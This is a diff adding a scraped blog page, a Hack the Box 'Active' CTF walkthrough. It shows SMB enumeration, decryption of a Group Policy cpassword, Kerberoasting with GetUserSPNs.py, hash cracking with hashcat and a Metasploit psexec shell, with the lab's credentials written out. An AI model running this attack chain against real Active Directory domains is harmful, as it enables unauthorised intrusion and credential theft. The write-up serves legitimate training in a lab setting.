@@ -1,0 +1,358 @@
+
+								
+																		Hack the Box: Active Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on December 11, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we are going to solve another CTF challenge “Active”. Active is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.
+Level: Easy
+Task: To find user.txt and root.txt file
+Penetration Methodologies
+Scanning Network
+
+Open ports and Running services (Nmap)
+
+Enumeration
+
+Identify share files (Linux4enum)
+Access share file via Anonymous login (smbclient)
+Decrypting cpassword (Gpprefdecrypt.py)
+
+Access Victim’s Shell via SMB connect
+
+Access share file user login
+Get User.txt
+
+Privilege Escalation 
+
+Find Service Principal Names (py)
+Crack the hash (Hashcat)
+Psexec Exploit (Metasploit)
+Get root.txt
+
+Walkthrough
+Scanning Network
+Note: Since these labs are online available therefore they have a static IP. The IP of Active is 10.10.10.100
+Let’s start off with our basic nmap command to find out the open ports and services.
+
+		
+		
+			
+			
+			
+			
+nmap -sV 10.10.10.100
+			
+				
+					
+				
+					1
+				
+						nmap -sV 10.10.10.100
+					
+				
+			
+		
+
+
+As you can observe from Nmap scanning result, there are so many open ports along with their running services, the OS is Microsoft Windows server 2008:r2:sp1 and you can also read the domain name “active.htb”.
+Enumeration
+I try eternal blue attack when I saw port 445 was open but I guess this was Patched version of SMB, therefore I have to start with enum4linux script. As we all know it is the best script for SMB enumeration.
+
+		
+		
+			
+			
+			
+			
+./enum4liux -S 10.10.10.100
+			
+				
+					
+				
+					1
+				
+						./enum4liux -S 10.10.10.100
+					
+				
+			
+		
+
+It has shown anonymous login for /Replication share file.
+
+Then I try to access /Replication with the help smbclient and run the following command to access this directory via anonymous login:
+
+		
+		
+			
+			
+			
+			
+smbclient //10.10.10.100/Replication
+			
+				
+					
+				
+					1
+				
+						smbclient //10.10.10.100/Replication
+					
+				
+			
+		
+
+
+Here I downloaded Groups.xml file which I found from inside the following path:
+
+		
+		
+			
+			
+			
+			
+\active.htb\Policies\{31B2F340–016D-11D2–945F-00C04FB984F9}\MACHINE\Preferences\Groups\
+			
+				
+					
+				
+					1
+				
+						\active.htb\Policies\{31B2F340–016D-11D2–945F-00C04FB984F9}\MACHINE\Preferences\Groups\
+					
+				
+			
+		
+
+So here I found cpassword attribute value embedded in the Groups.xml for user SVC_TGS.
+
+Therefore I download a python script “Gpprefdecrypt” from GitHub to decrypt the password of local users added via Windows 2008 Group Policy Preferences (GPP) and obtain the password: GPPstillStandingStrong2k18.
+
+		
+		
+			
+			
+			
+			
+python Gpprefdecrypt.py &lt; cpassword attribute value &gt;
+			
+				
+					
+				
+					1
+				
+						python Gpprefdecrypt.py &lt; cpassword attribute value &gt;
+					
+				
+			
+		
+
+
+Access Victim’s Shell via SMB connect
+Using the above credential we connect to SMB with the help of the following command and successfully able to catch our 1st flag “user.txt” file.
+
+		
+		
+			
+			
+			
+			
+smbclient //10.10.10.100/Users -U SVC_TGS
+			
+				
+					
+				
+					1
+				
+						smbclient //10.10.10.100/Users -U SVC_TGS
+					
+				
+			
+		
+
+
+Now, it’s time to hunt root.txt file and as always seen that for obtain root.txt file we need to escalate root privilege, therefore let’s add Host_IP and Host_name inside /etc/hosts file in our local machine.
+
+Privilege Escalation
+In nmap scanning result we saw port 88 was open for Kerberos, hence there must be some Service Principal Names (SPN) that are associated with the normal user account. Therefore we downloaded and install impacket from Github for using its python class GetUserSPN.py
+
+		
+		
+			
+			
+			
+			
+./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+			
+				
+					
+				
+					1
+				
+						./GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18
+					
+				
+			
+		
+
+I copied the hash value into a text file “hash.txt” for its decryption.
+
+Then with the help of hashcat, we find out the hash mode and as result, it showed 13100 for Kerberos 5 TGS-REP etype 23
+
+		
+		
+			
+			
+			
+			
+hashcat -h |grep -i tgs
+			
+				
+					
+				
+					1
+				
+						hashcat -h |grep -i tgs
+					
+				
+			
+		
+
+Finally, it was time to crack the hashes and obtain the password by using rockyou.txt wordlist.
+
+		
+		
+			
+			
+			
+			
+hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force --show
+			
+				
+					
+				
+					1
+				
+						hashcat -m 13100 hash.txt -a 0 /usr/share/wordlists/rockyou.txt --force --show
+					
+				
+			
+		
+
+Hurray!!! We got it, Ticketmaster1968 for the administrator.
+
+Without wasting time I load the Metasploit framework and run the following module to spawn full privilege system shell.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/windows/smb/psexec
+msf exploit windows/smb/psexec) &gt; set rhost 10.10.10.100
+msf exploit(windows/smb/psexec) &gt; set smbuser administrator
+msf exploit(windows/smb/psexec) &gt; set smbpass Ticketmaster1968
+msf exploit(windows/smb/psexec) &gt; exploit
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/windows/smb/psexecmsf exploit windows/smb/psexec) &gt; set rhost 10.10.10.100msf exploit(windows/smb/psexec) &gt; set smbuser administratormsf exploit(windows/smb/psexec) &gt; set smbpass Ticketmaster1968msf exploit(windows/smb/psexec) &gt; exploit
+					
+				
+			
+		
+
+BOOOMMM…………………
+Now we are inside the root shell, let’s chase towards root.txt file and finish this challenge.
+
+Yuppieee! We found our 2nd flag the root.txt file from inside /Users/Administrator/Desktop.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
